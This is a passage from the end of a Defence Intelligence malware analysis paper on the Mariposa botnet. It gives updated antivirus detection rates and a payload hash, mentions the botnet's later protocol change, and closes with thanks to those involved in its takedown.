results are now 31 out of 41 (75.61%).
The executable payload “8” with the MD5 hash c4e13b7cb9425ef18d95d446cad9c3e0
that was commanded to be executed on October 2nd originally had a detection rate of 6
out of 41. VirusTotal results are now 34 out of 41 (82.93%).
In November 2009, Mariposa updated to a new version that utilizes a 21 byte protocol
instead of the 7 byte analyzed in this paper. More information may be provided in the
future.

DefenceIntelligence.

20

Matt Thompson

9. Thank You
Defence Intelligence would like to express its utmost thanks to all individuals,
companies and agencies involved either directly or indirectly in the takedown of the
Mariposa botnet. You worked tirelessly to rid the Internet of this scourge and your
dedicated effort is appreciated. We look forward to working with you again soon.

DefenceIntelligence.

21

Matt Thompson